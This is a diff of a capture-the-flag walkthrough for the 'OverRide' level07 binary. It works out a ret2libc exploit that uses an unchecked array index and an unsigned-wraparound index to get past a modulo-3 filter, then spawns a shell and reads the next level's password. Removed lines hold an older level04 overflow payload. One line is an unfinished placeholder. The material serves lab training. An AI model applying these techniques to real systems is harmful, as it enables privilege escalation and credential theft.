@@ -1,72 +1,3 @@
-# ret2libc
-
-Stack:
-```
-esp            0xffffd520       0xffffd520
-ebp            0xffffd708       0xffffd708
-```
-
-esp - ebp:
-```
-Hex value:
-708 – 520 = 1E8
-
-Decimal value:
-1800 – 1312 = 488
-```
-
-Padding:
-```
-488 - (0x24 aka buf)36 = 452
-452 padding, +4 to reach return address aka 456 padding. Next 4 bytes are the return address.
-```
-
-Addresses:  
-`0xf7e6aed0` system  
-`0xf7f897ec` /bin/sh
-
-Explaination:
-```
-456 padding, we're going to write in the int buffer, since it is a buffer of int, we're going to divide our padding by 4 for the index.
-456 / 4 = 114
-so we'll have the address of system at index 114 and the address of /bin/sh at index 116. (no exit cause whatever)
-
-But we can't use the index 114 because it is divisible by 3, so we'll utilize the fact that this is unsigned int buffer to overflow the value to 114: 1073741938
-
-So let's convert all the values:
-index / number:
-116 / 4160264172
-1073741938 / 4159090384
-```
-Exploit:
-```
-level07@OverRide:~$ ./level07 
-----------------------------------------------------
-  Welcome to wil's crappy number storage service!   
-----------------------------------------------------
- Commands:                                          
-    store - store a number into the data storage    
-    read  - read a number from the data storage     
-    quit  - exit the program                        
-----------------------------------------------------
-   wil has reserved some storage :>                 
-----------------------------------------------------
-
-Input command: store
- Number: 4160264172
- Index: 116
- Completed store command successfully
-Input command: store
- Number: 4159090384
- Index: 1073741938
- Completed store command successfully
-Input command: quit
-$ whoami
-level08
-$ cat /home/users/level08/.pass
-7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
-```
-
 # Level07
 
 ## Answer
@@ -161,7 +92,7 @@ int main(int argc, char **argv, char **env)
     puts("----------------------------------------------------\n  Welcome to wil's crappy number storage service!   \n----------------------------------------------------\n Commands:                                          \n    store - store a number into the data storage    \n    read  - read a number from the data storage     \n    quit  - exit the program                        \n----------------------------------------------------\n   wil has reserved some storage :>                 \n----------------------------------");
     while (1)
     {
-        printf("Input command");
+        printf("Input command: ");
         ret = 1;
         fgets(cmd, 20, stdin);
         cmd[strlen(cmd) - 1] = 0;
@@ -174,16 +105,16 @@ int main(int argc, char **argv, char **env)
             break;
 
         if (ret)
-            printf(" Completed %s command successfully\n", cmd);
-        else
             printf(" Failed to do %s command\n", cmd);
+        else
+            printf(" Completed %s command successfully\n", cmd);
         memset(cmd, 0, 20);
     }
     return 0;
 }
 ```
 
-Let's focus on the `main` function.  It reads input using the `gets` function, which is known to be unsafe due to its potential for causing buffer overflows, as it lacks a mechanism to limit the number of bytes read. This will allow us to overflow the buffer and overwrite the return address of the `main` function.
+Let's focus on the `store_number` function.  It reads input using the `scanf` function, which is known to be safe has a mechanism to limit the number of bytes read. However, our buffer is only 100 unsigned integers long, which means that we can overflow it by providing an index greater than 100. This will allow us to overwrite the return address of the `main` function.
 
 ### Ret2Libc
 Check the [level01's walkthrough](../level01/walkthrough.md#ret2libc) for an explanation of the ret2libc technique.
@@ -213,52 +144,91 @@ We, therefore, need the addresses of the `system`, `exit` functions and the stri
 
 To find our padding, Let's analyze the stack layout of our program:
 ```bash
-(gdb) set follow-fork-mode child # Follow the child process
-
-(gdb) b *main+150 # Breaking after gets
-Breakpoint 1 at 0x804875e
-
-(gdb) b *main+168 # Breaking after wait
-Breakpoint 2 at 0x8048770
+(gdb) b *main+711 # Breaking before leave
+Breakpoint 1 at 0x80489ea
 
 (gdb) r # Run the program
-Starting program: /home/users/level04/level04
-[New process 2910]
-Give me some shellcode, k
-[Switching to process 2910]
+Starting program: /home/users/level07/level07
+[...]
 
-Breakpoint 1, 0x0804875e in main ()
+Breakpoint 1, 0x080489ea in main ()
 
 (gdb) info registers # Check esp and ebp addresses
 [...]
-esp            0xffffd650       0xffffd650
-ebp            0xffffd708       0xffffd708
+esp            0xffffd440       0xffffd440
+ebp            0xffffd628       0xffffd628
 [...]
 ```
 
-By calculating the difference between `esp` and `ebp` we can see that the stack is allocated 72 bytes:
+By calculating the difference between `esp` and `ebp` we can see that the stack is allocated 488 bytes:
 ```
-0xbffff728 - 0xbffff6e0 = b8 (184 in decimal)
+0xffffd628 - 0xffffd440 = 1e8 (488 in decimal)
 ```	
 
-Furthermore, we can see that our buffer is located at `0x20(%esp),%eax`. Since there is 184 bytes for the stack, our buffer will therefore require 152 bytes (184 - 32) before reaching `ebp`.
+Furthermore, we can see that our buffer is located at `0x24(%esp),%eax`. Since there is 488 bytes for the stack, our buffer will therefore require 452 bytes (488 - 36) before reaching `ebp`.
 
-Since our goal is to overflow the stack until we reach the return address of the main function, we need to add another 4 bytes to go from `ebp` to `ebp + 4` (the return address). So a total of 156 bytes (152 + 4).
+Since our goal is to overflow the stack until we reach the return address of the main function, we need to add another 4 bytes to go from `ebp` to `ebp + 4` (the return address). So a total of 456 bytes (452 + 4).
 
-Anything written beyond those 156 bytes will be treated as an address (only the 4 next bytes) and jumped to by the `ret` instruction of the `main` function.
+Anything written beyond those 456 bytes will be treated as an address (only the 4 next bytes) and jumped to by the `ret` instruction of the `main` function.
 
-Alright, let's craft our payload:
+Usually we'd just write the addresses to do a ret2libc, but in this case, we have to write the addresses in the buffer itself. The index (devided by 4 since it is an int buffer) will be the padding and the value will be the address.
+
+Since we need 456 bytes of padding, we'll write the address of `system` at index 114 (456 / 4), the address of `exit` at index 115 and the address of `/bin/sh` at index 116. However, we can't use the index 114 because of this check:
+```c
+if ((idx % 3 == 0) || (idx >> 0x18 == 0xb7)) // 0x18 is 24 and 0xb7 is 183
+{
+    puts(" *** ERROR! ***");
+    puts("   This index is reserved for wil!");
+    puts(" *** ERROR! ***");
+    return 1;
+}
 ```
-reminder: padding + address of system + address of exit + address of "/bin/sh"
 
-"\x90"*156 + "\xf7\xe6\xae\xd0" + "\xf7\xe5\xeb\x70" + "\xf7\xf8\x97\xec"
+As you can see any index that is a multiple of 3 will be reserved for `wil`. EXPLAIN WHY 1073741938 IS EQUAL TO 114 (BESIDES SHORT WRAPPING)
+
+So let's convert all the values:
+```
+system: 0xf7e6aed0 => 4159090384
+exit: 0xf7e5eb70 => 4159040368
+/bin/sh: 0xf7f897ec => 4160264172
+
+index / number:
+116 / 4160264172 => /bin/sh
+115 / 4159040368 => exit
+1073741938 / 4159090384 => system
 ```
 
 Let's run it:
 ```bash
-level04@OverRide:~$ (python -c 'print("\x90"*156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])' && echo cat /home/users/level05/.pass) | ./level04
-Give me some shellcode, k
-3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+level07@OverRide:~$ ./level07
+----------------------------------------------------
+  Welcome to wil's crappy number storage service!
+----------------------------------------------------
+ Commands:
+    store - store a number into the data storage
+    read  - read a number from the data storage
+    quit  - exit the program
+----------------------------------------------------
+   wil has reserved some storage :>
+----------------------------------------------------
+
+Input command: store
+ Number: 4160264172
+ Index: 116
+ Completed store command successfully
+Input command: store
+ Number: 4159040368
+ Index: 115
+ Completed store command successfully
+Input command: store
+ Number: 4159090384
+ Index: 1073741938
+ Completed store command successfully
+Input command: quit
+$ whoami
+level08
+$ cat /home/users/level08/.pass
+7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
 ```
 
-We are now level05! Let's move on to the next level.
+We are now level08! Let's move on to the next level.
